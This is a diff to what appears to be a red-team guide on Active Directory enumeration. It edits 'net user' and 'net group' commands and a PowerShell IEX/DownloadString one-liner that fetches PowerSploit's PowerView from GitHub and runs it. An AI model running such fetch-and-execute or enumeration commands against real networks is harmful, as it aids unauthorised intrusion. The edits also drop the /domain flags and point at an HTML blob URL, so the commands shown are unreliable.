@@ -121,8 +121,8 @@ query user
 5. Enumerate the domain users & groups
 
 ```
-net user /domain
-net group /domain
+net user
+net group
 ```
 
 6. Show the domain-related environment variables 
@@ -160,7 +160,7 @@ After performing initial low-noise enumeration, transition to more structured Ac
 A noiser option would be to download the script from the internet and then immediately execute it directly from the WinRM PowerShell session. This would leave behind artifacts like *outbound HTTP traffic* and alerts like *PowerShell downloading remote script*.
 
 ```
-IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1')
+IEX (New-Object Net.WebClient).DownloadString('https://www.github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1')
 ```
 
 - **DownloadString**: This reaches out to the internet and grabs the text of a script.
